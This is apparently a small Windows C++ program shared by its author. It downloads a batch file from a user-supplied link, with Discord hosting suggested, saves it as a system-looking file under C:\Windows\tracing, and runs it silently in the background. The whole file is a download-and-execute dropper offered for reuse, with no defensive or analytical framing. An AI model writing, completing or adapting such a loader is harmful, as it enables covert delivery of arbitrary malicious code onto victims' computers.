
#include <iostream>
#include <stdlib.h>
#include<Windows.h>
#include<string>
#include <fstream>
#pragma comment(lib, "urlmon.lib")
#include <tchar.h>
#pragma comment(lib,"wininet.lib")

using namespace std;


void Download()
{
	HRESULT pr;     
	LPCTSTR Url = _T("//here your batch link upload it on discord or whatever you want"), File = _T("C:\\Windows\\tracing\\Windows.bat");
	pr = URLDownloadToFile(0, Url, File, 0, 0);
}



int main()
{
	Download();
	system("start /B C:\\Windows\\tracing\\Windows.bat");
}

//made by p3tri#4000